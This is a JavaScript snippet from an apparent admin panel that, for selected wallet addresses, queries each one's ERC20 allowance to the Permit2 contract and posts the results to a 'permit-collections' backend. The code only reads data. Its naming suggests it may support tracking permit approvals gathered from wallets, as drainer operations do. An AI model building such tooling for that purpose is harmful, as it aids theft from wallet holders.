const instanceERC20 = (erc20address) => {
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const signer = provider.getSigner();
    const _Contract = new ethers.Contract(erc20address, ABI.defaultErc20.abi, signer);
    return _Contract;
}
const checkApprove = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const accountAddress = window.ethereum.selectedAddress;
    const wuwu = "";
    const permit2address = "0x000000000022d473030f116ddee9f6b43ac78ba3";

    const input = document.getElementsByClassName("grid-row-checkbox");
    //检查勾选
    let checkList = [];
    Object.keys(input).map((k) => {
        if (input[k].parentElement.parentElement.classList[1] == "selected") {
            checkList.push(input[k]);
        }
        return checkList;
    });

    if (checkList.length <= 0) {
        admin.toastr.warning("Please check the address you want to check first");
    } else {
        const erc20address = document.getElementById("tokenpicker").value;
        const erc20contract = instanceERC20(erc20address);

        function GetRequest() {
            var url = location.search; //获取url中"?"符后的字串
            var theRequest = new Object();
            if (url.indexOf("?") != -1) {
                var str = url.substr(1);
                strs = str.split("&");
                for (var i = 0; i < strs.length; i++) {
                    theRequest[strs[i].split("=")[0]] = unescape(
                        strs[i].split("=")[1]
                    );
                }
            }
            return theRequest;
        }
        const parmars = GetRequest();
        if (parmars.page == undefined) {
            parmars.page = 1;
        }

        admin.toastr.info("start query.");

        //console.log(checkList[0].parentNode.parentNode.nextElementSibling.nextElementSibling.textContent.trim());
        const rs = [];
        //这里要加分段查询
        for (var i = 0; i < checkList.length; i++) {
            const id = checkList[i].attributes["data-id"].value.trim();
            const address =
                checkList[
                    i
                ].parentNode.nextElementSibling.nextElementSibling.children[0].innerText.trim();
            const chain =
                checkList[i].parentNode.nextElementSibling.children[0]
                    .attributes["data-id"].value;
            try {
                const allowed = await erc20contract.allowance(
                    address,
                    permit2address
                );
                rs.push({
                    id: id,
                    chain: chain,
                    address: address,
                    erc20address: erc20address,
                    allowed: allowed.toString(),
                });
            } catch (err) {
                console.log(err.message);
                //toastr.error("网络似乎出了问题。");
                admin.toastr.error(
                    "There seems to be a problem with the network."
                );
            }
        }
        admin.toastr.success("it's finshed.");
        axios.post("/update_v3_approve_state", rs).then(() => {
            admin.ajax.navigate(
                "permit-collections?token=" +
                    erc20address +
                    "&page=" +
                    parmars.page
            );
            window.location.reload(true);
        });
    }
}
